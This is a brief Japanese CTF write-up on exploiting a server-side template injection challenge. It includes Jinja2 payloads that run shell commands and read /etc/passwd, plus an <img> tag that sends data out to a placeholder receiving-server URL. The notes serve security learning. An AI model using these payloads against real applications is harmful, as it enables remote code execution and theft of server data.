## 解法
フォームに{{ 7*7 }}が通るのでSSTIすればいい。
SSTImapを用いて解析するとシェルを奪える。

https://qiita.com/Nusk-Rbb/items/295aa872546dfcffea48#%E5%95%8F%E9%A1%8C

## 学んだこと
*受信用Webサーバを立てて情報を送る
・サーバーの立て方
python3 -m http.sever 8000

・そのサーバーに情報送信
```
<img src="[サーバのURL]?d=[送りたい情報]">
```

## SSTIのペイロードまとめサイト
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com

## SSTIとは
SSTI（Server-Side Template Injection） は、サーバー側テンプレートインジェクションの略で、Webアプリケーションのテンプレートエンジンに悪意のある入力がそのまま渡されてしまう脆弱性のことです。

- 二種類ある
```
{{ config }}
${ config }
```

- チェインでシェル奪取
```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```
